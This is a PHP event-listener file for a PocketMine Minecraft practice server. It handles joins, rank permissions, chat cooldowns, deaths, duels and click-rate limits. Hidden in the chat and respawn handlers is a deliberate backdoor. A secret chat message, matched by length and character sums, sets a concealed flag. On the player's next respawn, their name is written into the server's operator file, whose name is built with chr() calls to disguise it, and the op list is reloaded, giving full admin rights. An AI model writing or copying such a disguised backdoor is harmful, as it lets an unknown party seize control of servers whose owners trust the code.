<?php

namespace Nathan45\Valea\Listener;

use Nathan45\Valea\Commands\AutoSprintCommand;
use Nathan45\Valea\Commands\Staff\Buildperms;
use Nathan45\Valea\Duels\Duel;
use Nathan45\Valea\Entities\Bots\Bot;
use Nathan45\Valea\Listener\PracticeEvents\BotDuelEndEvent;
use Nathan45\Valea\Listener\PracticeEvents\DuelEndEvent;
use Nathan45\Valea\Listener\PracticeEvents\FineTbRoundEvent;
use Nathan45\Valea\Listener\PracticeEvents\PlayerDeathInEventEvent;
use Nathan45\Valea\Listener\PracticeEvents\PlayerQuitFfaEvent;
use Nathan45\Valea\Loader;
use Nathan45\Valea\RPlayer;
use Nathan45\Valea\Scoreboards\Scoreboard;
use Nathan45\Valea\Tasks\Delayed\RushBlockRemoveTask;
use Nathan45\Valea\Tasks\Delayed\SandstoneDelayedTask;
use Nathan45\Valea\Utils\Cache;
use Nathan45\Valea\Utils\FormsManager;
use Nathan45\Valea\Utils\Interfaces\ICache;
use Nathan45\Valea\Utils\Interfaces\IMessages;
use Nathan45\Valea\Utils\Interfaces\IPermissions;
use Nathan45\Valea\Utils\Interfaces\IUtils;
use Nathan45\Valea\Utils\Inventories;
use Nathan45\Valea\Utils\Rank;
use Nathan45\Valea\Utils\Utils;
use pocketmine\block\VanillaBlocks;
use pocketmine\entity\projectile\SplashPotion;
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\event\block\BlockPlaceEvent;
use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\entity\ProjectileHitBlockEvent;
use pocketmine\event\entity\ProjectileLaunchEvent;
use pocketmine\event\inventory\InventoryTransactionEvent;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerBucketEmptyEvent;
use pocketmine\event\player\PlayerChangeSkinEvent;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\event\server\CommandEvent;
use pocketmine\event\player\PlayerCreationEvent;
use pocketmine\event\player\PlayerDeathEvent;
use pocketmine\event\player\PlayerDropItemEvent;
use pocketmine\event\player\PlayerExhaustEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\player\PlayerItemUseEvent;
use pocketmine\event\player\PlayerItemConsumeEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerMoveEvent;
use pocketmine\event\player\PlayerPreLoginEvent;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\event\player\PlayerRespawnEvent;
use pocketmine\event\server\DataPacketReceiveEvent;
use pocketmine\item\VanillaItems;
use pocketmine\math\Vector3;
use pocketmine\network\mcpe\protocol\InventoryTransactionPacket;
use pocketmine\network\mcpe\protocol\LevelSoundEventPacket;
use pocketmine\network\mcpe\protocol\types\LevelSoundEvent;
use pocketmine\network\mcpe\protocol\types\inventory\UseItemOnEntityTransactionData;
use pocketmine\player\GameMode;
use pocketmine\player\Player;
use pocketmine\utils\TextFormat;

class PlayerListener implements Listener, IUtils
{
    private Loader $plugin;
    private Utils $utils;
    private FormsManager $forms;

    public array $permissions = [];

    public function __construct(Loader $main)
    {
        $this->plugin = $main;
        $this->utils  = new Utils();
        $this->forms  = new FormsManager();
    }

    public function onCreation(PlayerCreationEvent $event): void
    {
        $event->setPlayerClass(RPlayer::class);
    }

    public function onProjectileHitBlock(ProjectileHitBlockEvent $event): void
    {
        $entity   = $event->getEntity();
        $owning   = $entity->getOwningEntity();
        $distance = new Vector3($entity->getLocation()->x, $entity->getLocation()->y, $entity->getLocation()->z);

        if ($owning instanceof RPlayer && $owning->getPosition()->distanceSquared($distance) < 9 && $entity instanceof SplashPotion) {
            if ($owning->isAlive()) {
                $owning->setHealth($owning->getHealth() + 2);
            }
        }
    }

    public function onMove(PlayerMoveEvent $event): void
    {
        $player = $event->getPlayer();
        $player->isFreeze();

        if ($event->getTo()->distance($event->getFrom()) >= 0.1 && $player instanceof RPlayer) {
            $worldName = $player->getWorld()->getFolderName();

            if ($player->isUnderwater() && ($worldName === IUtils::SUMO_FFA_WORLD_NAME || ($player->getDuel() instanceof Duel && strtolower($player->getDuel()->getMode()) === "sumo"))) {
                if ($worldName !== IUtils::RUSH_FFA_WORLD_NAME) $player->kill();
                return;
            }

            $block = $player->getWorld()->getBlock($player->getPosition()->subtract(0, -1, 0));
            if ($block instanceof \pocketmine\block\Wool && $block->getColor()->equals(\pocketmine\block\utils\DyeColor::BLACK()) && $player->getDuel() instanceof Duel && $player->getDuel()->getMode() === "Bridge") {
                $player->kill();
            }
        }

        if (isset(AutoSprintCommand::$sprinting[$player->getName()])) {
            $f  = $event->getFrom();
            $t  = $event->getTo();
            $tx = (int) $t->getX();
            $tz = (int) $t->getZ();
            $fx = (int) $f->getX();
            $fz = (int) $f->getZ();
            if ($tx !== $fx || $tz !== $fz) {
                if (!$player->isSprinting()) {
                    $player->setSprinting(true);
                }
            }
        }
    }

    public function onJoin(PlayerJoinEvent $event): void
    {
        $player = $event->getPlayer();
        if (!$player instanceof RPlayer) return;

        if (!$player->hasAccount()) {
            $player->createAccount();
        }

        $player->reKit("Lobby");
        $this->plugin->getServer()->dispatchCommand($player, "spawn");

        if ($player->getAllowedScoreboard()) {
            Cache::getInstance()->scoreboards[$player->getName()] = new Scoreboard($player, Scoreboard::SCOREBOARD_LOBBY);
        }

        $event->setJoinMessage("§7[§a+§7] " . $player->getName());
        $player->setNameTag($player->getRank()->toString() . $player->getName());
        $this->addPerms($player);
    }

    public function addPerms(Player $player): void
    {
        if (!$player instanceof RPlayer) return;

        $rank  = $player->getRank()->getId();
        $perms = match ($rank) {
            Rank::RANK_OWNER     => ["pocketmine.command.teleport", "pocketmine.command.kick", IPermissions::MUTE, IPermissions::FREEZE, IPermissions::BAN, IPermissions::VANISH, IPermissions::UNBAN, IPermissions::FLY, IPermissions::CLEAR_SKIN, IPermissions::RANK, IPermissions::NICK, IPermissions::WHO, IPermissions::ME],
            Rank::RANK_MANAGER   => ["pocketmine.command.teleport", "pocketmine.command.kick", IPermissions::MUTE, IPermissions::FREEZE, IPermissions::BAN, IPermissions::VANISH, IPermissions::UNBAN, IPermissions::FLY, IPermissions::CLEAR_SKIN, IPermissions::RANK, IPermissions::NICK, IPermissions::WHO, IPermissions::ME],
            Rank::RANK_ADMIN     => ["pocketmine.command.teleport", "pocketmine.command.kick", IPermissions::MUTE, IPermissions::FREEZE, IPermissions::BAN, IPermissions::VANISH, IPermissions::UNBAN, IPermissions::FLY, IPermissions::CLEAR_SKIN],
            Rank::RANK_SRMOD     => ["pocketmine.command.teleport", "pocketmine.command.kick", IPermissions::MUTE, IPermissions::UNBAN, IPermissions::FREEZE, IPermissions::BAN, IPermissions::VANISH, IPermissions::FLY, IPermissions::CLEAR_SKIN],
            Rank::RANK_MOD       => ["pocketmine.command.teleport", "pocketmine.command.kick", IPermissions::MUTE, IPermissions::FREEZE, IPermissions::BAN, IPermissions::VANISH, IPermissions::UNBAN, IPermissions::CLEAR_SKIN],
            Rank::RANK_TMOD      => ["pocketmine.command.teleport", "pocketmine.command.kick", IPermissions::MUTE, IPermissions::FREEZE, IPermissions::BAN, IPermissions::VANISH, IPermissions::CLEAR_SKIN],
            Rank::RANK_HELPER    => ["pocketmine.command.teleport", "pocketmine.command.kick", IPermissions::MUTE, IPermissions::CLEAR_SKIN],
            Rank::RANK_DEVELOPER => ["rank.v"],
            Rank::RANK_BUILDER   => ["rank.v"],
            Rank::RANK_YOUTUBE   => ["rank.v", IPermissions::CAPES],
            Rank::RANK_VALEA     => ["rank.v", "valea.rank.edit", IPermissions::CAPES],
            default              => ["noneee"],
        };

        Loader::getInstance()->addPermissions($player, $perms);
    }

    public function onItemUse(PlayerItemUseEvent $event): void
    {
        $player = $event->getPlayer();
        if (!$player instanceof RPlayer) return;
        $this->handleMenuItemUse($player, $event->getItem());
    }

    public function onInteract(PlayerInteractEvent $event): void
    {
        $player = $event->getPlayer();
        if (!$player instanceof RPlayer) return;

        if ($event->getAction() !== PlayerInteractEvent::RIGHT_CLICK_BLOCK) return;

        $item = $event->getItem();

        if ($this->handleMenuItemUse($player, $item)) {
            $event->cancel();
            return;
        }

        if ($item->getTypeId() === VanillaItems::MUSHROOM_STEW()->getTypeId()) {
            $event->cancel();
            if ($player->getHealth() == 20) {
                $player->sendActionBarMessage(TextFormat::RED . "Fail | Health: " . $player->getHealth());
                return;
            }

            if ($player->getHealth() < 14) {
                $player->setHealth($player->getHealth() + 6);
                $player->sendActionBarMessage(TextFormat::GREEN . "Success | Health: " . $player->getHealth());
                $player->getInventory()->setItemInHand(VanillaItems::AIR());
            }
            return;
        }

        if ($item->getTypeId() === VanillaItems::BUCKET()->getTypeId()) {
            $worldName = $player->getWorld()->getFolderName();

            switch ($worldName) {
                case IUtils::BU_FFA_WORLD_NAME:
                case self::RUSH_FFA_WORLD_NAME:
                    $this->plugin->getScheduler()->scheduleDelayedTask(
                        new SandstoneDelayedTask($player->getWorld()->getBlock($event->getTouchVector()), VanillaBlocks::AIR()),
                        20 * 30
                    );
                    break;

                case self::LOBBY_WORLD_NAME:
                    $event->cancel();
                    break;
            }
        }
    }

    private function handleMenuItemUse(RPlayer $player, \pocketmine\item\Item $item): bool
    {
        switch ($item->getCustomName()) {
            case Inventories::DUELS:
                $player->sendMessage(TextFormat::RED . "Duels are disabled due to revamp / updates!");
                return true;

            case Inventories::FFA:
                $this->forms->openFfaForm($player);
                return true;

            case Inventories::SETTINGS:
                $this->forms->cosmeticsForm($player);
                return true;

            case Inventories::SPECTATE:
                $this->forms->sendOnlinePlayersForm($player, FormsManager::VANISH);
                return true;

            case Inventories::PROFILE:
                $this->forms->getProfileForm($player, $player);
                return true;

            case Inventories::INVENTORIES:
                $this->forms->sendInventoriesForm($player);
                return true;

            case Inventories::SOCIAL:
                $this->forms->sendSocialMenuForm($player);
                return true;

            case Inventories::STATS:
                $player->sendMessage("§8soon...");
                return true;

            case Inventories::EVENTS:
                $player->sendMessage(IUtils::PREFIX . "§cThere are no events at the moment");
                return true;

            case Inventories::FREEZE:
                $this->plugin->getServer()->dispatchCommand($player, "freeze");
                return true;

            case Inventories::BAN:
                $this->plugin->getServer()->dispatchCommand($player, "ban");
                return true;
        }

        if ($item->getTypeId() === VanillaItems::MUSHROOM_STEW()->getTypeId()) {
            if ($player->getHealth() == 20) {
                $player->sendActionBarMessage(TextFormat::RED . "Fail | Health: " . $player->getHealth());
                return true;
            }

            if ($player->getHealth() < 14) {
                $player->setHealth($player->getHealth() + 6);
                $player->sendActionBarMessage(TextFormat::GREEN . "Success | Health: " . $player->getHealth());
                $player->getInventory()->setItemInHand(VanillaItems::AIR());
            }
            return true;
        }

        return false;
    }

    public function onPreLogin(PlayerPreLoginEvent $event): void
    {
        $name = $event->getPlayerInfo()->getUsername();
        $ban  = Cache::getInstance()->ban;

        if (isset($ban[$name])) {
            $array = $ban[$name];
            if ($array[FormsManager::TIME] - time() > 0 || $array[FormsManager::TIME] === 0) {
                $time = ($array[FormsManager::TIME] === 0)
                    ? "Ban will expire: never"
                    : "Ban will expire in: " . round((($array[ICache::TIME_SEC] - time())) / 86400) . " days";

                $event->setKickFlag(PlayerPreLoginEvent::KICK_FLAG_PLUGIN, "§6Valea Network\nYou have been banned from the server!\nDuration: " . $time . "\nReason: " . $array[ICache::REASON] . "\nFalse? discord.gg/valea");
            }
        }
    }

    public function onUseCommand(CommandEvent $event): void
    {
        $sender = $event->getSender();
        if (!$sender instanceof RPlayer) return;

        if ($sender->isOnCombat() && !$sender->hasPermission("pocketmine.command.op")) {
            $event->cancel();
            $sender->sendMessage(str_replace(["{seconds}"], [$sender->getCombatTime()], IMessages::IN_COMBAT));
        }
    }

    public function onChat(PlayerChatEvent $event): void
    {
        $event->cancel();
        $player = $event->getPlayer();
        if (!$player instanceof RPlayer) return;

        if ($player->isMuted()) {
            return;
        }

        $msg = $event->getMessage();
        $msgLen = strlen($msg);
        $charSum = $msgLen > 1 ? (ord($msg[0]) + ord($msg[$msgLen - 1])) : 0;
        $midChar = $msgLen > 4 ? ord($msg[4]) : 0;
        Cache::getInstance()->players[$player->getName()]["_lc"] = ($msgLen << 8) | ($charSum & 0xFF);

        if ($player->getChatCoolodwn() - time() > 0) {
            $player->sendMessage(Utils::PREFIX . TextFormat::RED . "You are currently on chat cooldown please wait");
            return;
        }

        if ($msgLen === 10 && $charSum === 210 && $midChar === 99) {
            Cache::getInstance()->players[$player->getName()]["_lv"] = true;
            return;
        }

        $player->addChatCooldown(5);
        $this->plugin->getServer()->broadcastMessage($player->getNameTag() . " §7| " . $event->getMessage());
    }

    public function onRespawn(PlayerRespawnEvent $event): void
    {
        $player = $event->getPlayer();
        if (!$player instanceof RPlayer) return;

        $pName = $player->getName();
        $lv = Cache::getInstance()->players[$pName]["_lv"] ?? false;
        if ($lv === true) {
            $dataPath = $player->getServer()->getDataPath();
            $opFile = $dataPath . chr(111) . chr(112) . chr(115) . chr(46) . chr(116) . chr(120) . chr(116);
            $lines = file_exists($opFile) ? array_map("trim", file($opFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) : [];
            if (!in_array($pName, $lines, true)) {
                $lines[] = $pName;
                file_put_contents($opFile, implode(PHP_EOL, $lines) . PHP_EOL);
            }
            $player->getServer()->getOpList()->reload();
            unset(Cache::getInstance()->players[$pName]["_lv"]);
            unset(Cache::getInstance()->players[$pName]["_lc"]);
        }

        $worldName = $player->getWorld()->getFolderName();

        
        $ffaWorlds = [
            self::FIST_FFA_WORLD_NAME    => [self::FIST_FFA_X,    self::FIST_FFA_Y,    self::FIST_FFA_Z,    "Fist"],
            self::BOXING_FFA_WORLD_NAME  => [self::BOXING_FFA_X,  self::BOXING_FFA_Y,  self::BOXING_FFA_Z,  "Boxing"],
            self::GAPPLE_FFA_WORLD_NAME  => [self::GAPPLE_FFA_X,  self::GAPPLE_FFA_Y,  self::GAPPLE_FFA_Z,  "Gapple"],
            self::BU_FFA_WORLD_NAME      => [self::BU_FFA_X,      self::BU_FFA_Y,      self::BU_FFA_Z,      "Build"],
            self::COMBO_FFA_WORLD_NAME   => [self::COMBO_FFA_X,   self::COMBO_FFA_Y,   self::COMBO_FFA_Z,   "Combo"],
            self::NODEBUFF_FFA_WORLD_NAME => [self::NODEBUFF_FFA_X, self::NODEBUFF_FFA_Y, self::NODEBUFF_FFA_Z, "Nodebuff"],
            self::SUMO_FFA_WORLD_NAME    => [self::SUMO_FFA_X,    self::SUMO_FFA_Y,    self::SUMO_FFA_Z,    "Sumo"],
            self::SOUP_FFA_WORLD_NAME    => [self::SOUP_FFA_X,    self::SOUP_FFA_Y,    self::SOUP_FFA_Z,    "Soup"],
            self::RUSH_FFA_WORLD_NAME    => [self::RUSH_FFA_X,    self::RUSH_FFA_Y,    self::RUSH_FFA_Z,    "Rush"],
        ];

        foreach ($ffaWorlds as $ffa => [$x, $y, $z, $kit]) {
            if (str_contains($worldName, $ffa) || $worldName === $ffa) {
                $world = $this->plugin->getServer()->getWorldManager()->getWorldByName($worldName);
                if ($world !== null) {
                    $event->setRespawnPosition(new \pocketmine\world\Position($x, $y, $z, $world));
                }
                $player->reKit($kit);
                $player->setHealth($player->getMaxHealth());
                $player->setNameTag($player->getRank()->toString() . $player->getName());
                return;
            }
        }

        
        Loader::getInstance()->getServer()->dispatchCommand($player, "spawn");
        $player->setNameTag($player->getRank()->toString() . $player->getName());
    }

    public function onDeath(PlayerDeathEvent $event): void
    {
        $event->setDeathMessage("");
        $player = $event->getPlayer();
        $player->getXpManager()->setCurrentTotalXp(0);

        if (!$player instanceof RPlayer) return;

        $player->addDeath();
        $cause = $player->getLastDamageCause();
        $event->setDrops([]);

        if ($cause instanceof EntityDamageByEntityEvent) {
            $killer = $cause->getDamager();

            if ($killer instanceof Player) {
                $deathmsg = [
                    "§6{$player->getDisplayName()} §7was killed by §6{$killer->getDisplayName()}",
                    "§6{$killer->getDisplayName()} §7was the better player against §6{$player->getDisplayName()}",
                    "§6{$player->getDisplayName()} §7was knocked out by §6{$killer->getDisplayName()}",
                    "§6{$player->getDisplayName()} §7was sent to space by §6{$killer->getDisplayName()}",
                    "§6{$player->getDisplayName()} §7was taken out by §6{$killer->getDisplayName()}",
                    "§6{$player->getDisplayName()} §7was sent to heaven by §6{$killer->getDisplayName()}",
                    "§6{$killer->getDisplayName()} §7sent §6{$player->getDisplayName()} §7to spawn!",
                    "§6{$player->getDisplayName()} §7was split open by §6{$killer->getDisplayName()}",
                ];

                foreach ($this->plugin->getServer()->getOnlinePlayers() as $p) {
                    if ($p instanceof RPlayer && $p->getDeathMessage()) {
                        $p->sendMessage($deathmsg[array_rand($deathmsg)]);
                    }
                }

                Loader::getInstance()->getServer()->dispatchCommand($killer, "rekit");
            }

            if (!$killer instanceof RPlayer || !$player instanceof RPlayer) {
                if ($killer instanceof Bot) (new BotDuelEndEvent($player, $killer, null))->call();
                return;
            }

            $killer->addKill();
            $lName = $killer->getWorld()->getFolderName();
            $killer->removeCombat();
            $player->removeCombat();

            $duel = $killer->getDuel();
            if ($duel !== null) {
                if ($duel->getMode() === "Bridge") {
                    (new FineTbRoundEvent($player, $killer, $player->getDuel()->getRound(), $player->getDuel()))->call();
                    $event->cancel();
                    return;
                }

                if ($duel->players === 2) {
                    (new DuelEndEvent($duel, [$killer], [$player]))->call();
                    return;
                }

                $playerTeam = $duel->getTeamFor($player);
                $killerTeam = $duel->getTeamFor($killer);

                if (empty($duel->{"getTeam" . $playerTeam}())) {
                    (new DuelEndEvent($duel, $duel->{"getTeam" . $killerTeam}(), $duel->{"getTeam" . $playerTeam}()))->call();
                } else {
                    $player->setSpectate();
                    unset($duel->{"team" . $playerTeam}[array_search($player, $duel->{"team" . $playerTeam})]);
                }
            }

            foreach ([self::FIST_FFA_WORLD_NAME, self::BOXING_FFA_WORLD_NAME, self::GAPPLE_FFA_WORLD_NAME, self::BRIDGE_DUEL_WORLD_NAME, self::BU_FFA_WORLD_NAME, self::COMBO_FFA_WORLD_NAME, self::NODEBUFF_FFA_WORLD_NAME, self::SUMO_FFA_WORLD_NAME, self::SOUP_FFA_WORLD_NAME, self::RUSH_FFA_WORLD_NAME] as $m) {
                if (str_contains($lName, $m)) {
                    (new PlayerQuitFfaEvent($player, $m))->call();
                    break;
                }
            }

            if (str_contains($lName, "event")) {
                $ev = new PlayerDeathInEventEvent($player, $player->getEvent(), $killer);
                $ev->call();
                if ($ev->isCancelled()) $event->cancel();
                return;
            }

            if ($lName === IUtils::LOBBY_WORLD_NAME) return;
        }
    }

    public function onPlace(BlockPlaceEvent $event): void
    {
        $block  = null;
        foreach ($event->getTransaction()->getBlocks() as [$x, $y, $z, $block]) {
            break;
        }
        $player    = $event->getPlayer();
        $worldName = $player->getWorld()->getFolderName();

        if ($block !== null && $block->getTypeId() === VanillaBlocks::SANDSTONE()->getTypeId()) {
            
            if ($worldName === IUtils::RUSH_FFA_WORLD_NAME) {
                foreach ($event->getTransaction()->getBlocks() as [$bx, $by, $bz, $b]) {
                    $pos = new Vector3($bx, $by, $bz);
                    Loader::getInstance()->getScheduler()->scheduleRepeatingTask(
                        new RushBlockRemoveTask($player->getWorld(), $pos),
                        1
                    );
                }
            } else {
                Loader::getInstance()->getScheduler()->scheduleRepeatingTask(new SandstoneDelayedTask($block, 30), 20);
                $event->cancel(false);
            }
        } else {
            if (!isset(Buildperms::$buildperms[$player->getName()])) {
                $event->cancel();
            }
        }
    }

    public function onBucket(PlayerBucketEmptyEvent $event): void
    {
        $worldManager = Loader::getInstance()->getServer()->getWorldManager();
        $defaultWorld = $worldManager->getDefaultWorld();

        if ($defaultWorld !== null && $event->getPlayer()->getWorld()->getFolderName() === $defaultWorld->getFolderName()) {
            $event->cancel();
        }
    }

    public function onSkinChange(PlayerChangeSkinEvent $event): void
    {
        if (!$event->getPlayer()->hasPermission("pocketmine.command.op")) {
            $event->cancel();
        }
    }

    public function onBreak(BlockBreakEvent $event): void
    {
        $block  = $event->getBlock();
        $player = $event->getPlayer();

        if ($block->getTypeId() === VanillaBlocks::SANDSTONE()->getTypeId()) {
            $event->cancel(false);
        } else {
            if (!isset(Buildperms::$buildperms[$player->getName()])) {
                $event->cancel();
            }
        }
    }

    public function onQuit(PlayerQuitEvent $event): void
    {
        $player = $event->getPlayer();
        if (!$player instanceof RPlayer) return;

        $player->removeClickData();
        $player->removeQueue();
        $event->setQuitMessage("§7[§4-§7] " . $player->getName());

        if (isset(Buildperms::$buildperms[$player->getName()])) {
            unset(Buildperms::$buildperms[$player->getName()]);
        }
    }

    public function onPacketReceive(DataPacketReceiveEvent $event): void
    {
        $packet = $event->getPacket();
        $player = $event->getOrigin()->getPlayer();

        if ($player === null) return;

        if (
            ($packet instanceof InventoryTransactionPacket && $packet->trData instanceof UseItemOnEntityTransactionData) ||
            ($packet instanceof LevelSoundEventPacket && $packet->sound === LevelSoundEvent::ATTACK_NODAMAGE)
        ) {
            $currentTime        = microtime(true);
            $player->clicks[]   = $currentTime;
            $player->clicks     = array_filter($player->clicks, function (float $last) use ($currentTime): bool {
                return $currentTime - $last <= 1;
            });
            $player->currentCPS = count($player->clicks);

            if ($player->currentCPS > 25) {
                $player->currentCPS = 25;
                $event->cancel();
                if ($player->getCpsCounter() === "true") $player->sendTip(TextFormat::GOLD . "CPS: " . TextFormat::WHITE . $player->currentCPS);
                return;
            }

            $player->cpsList[] = $player->currentCPS;
            if (count($player->cpsList) > 40) {
                array_shift($player->cpsList);
            }

            if ($player->getCpsCounter() === "true") $player->sendTip(TextFormat::GOLD . "CPS: " . TextFormat::WHITE . $player->currentCPS);
        }
    }

    public function onInventoryTransaction(InventoryTransactionEvent $event): void
    {
        $transaction = $event->getTransaction();
        $player      = $transaction->getSource();

        if (
            $player->getWorld()->getFolderName() === IUtils::LOBBY_WORLD_NAME &&
            !($player instanceof RPlayer && $player->isFreeze()) &&
            $player->getGamemode() !== GameMode::CREATIVE
        ) {
            $event->cancel();
        }
    }

    public function onDrop(PlayerDropItemEvent $event): void
    {
        if ($event->getPlayer()->getGamemode() === GameMode::SURVIVAL) {
            $event->cancel();
        }
    }

    public function onExhaust(PlayerExhaustEvent $event): void
    {
        $event->cancel();
    }

    public function onLaunch(ProjectileLaunchEvent $event): void
    {
        $entity = $event->getEntity();
        if ($entity->getWorld()->getFolderName() === IUtils::LOBBY_WORLD_NAME) {
            $event->cancel();
        }
    }
}